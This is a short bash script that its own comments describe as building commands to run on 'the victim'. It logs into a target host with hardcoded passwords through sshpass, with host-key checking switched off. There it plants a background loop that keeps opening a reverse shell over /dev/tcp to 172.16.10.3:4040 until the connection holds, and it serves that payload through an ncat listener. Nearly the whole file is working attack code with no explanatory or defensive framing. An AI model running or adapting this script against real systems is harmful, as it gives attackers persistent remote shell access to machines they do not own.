#!/bin/bash

LOCAL_COPY="/home/output.log"
JB_LOG="/home/jumpbox.log"
TARGET="10.10.6.3"
SSH_PASSWD="mypassword"
SSH_RTR_PASSWD="root"

## Building the string of commands we want executed on the victim
START="("
END=")"
SSH_CMD1="ip route show"
SSH_CMD2="{ while (! netstat -an | grep -q \\\"172.16.10.3:4040 .* ESTABLISHED\\\"); do { bash -c \\\"bash >& /dev/tcp/172.16.10.3/4040 0>&1\\\" & sleep 15; }; done; } >/dev/null 2>&1 &"
CMD1="sshpass -p $SSH_PASSWD ssh -o StrictHostKeyChecking=no $TARGET \"($SSH_CMD1;$SSH_CMD2)\""
# echo "$SSH_CMD2"
# CMD1="sshpass -p $SSH_PASSWD ssh -o StrictHostKeyChecking=no $TARGET \"$SSH_CMD2\""
# CMD2="sshpass -p $SSH_PASSWD ssh -o StrictHostKeyChecking=no $TARGET"

echo "$START$CMD1$END" | ncat -l 4444 >> $JB_LOG &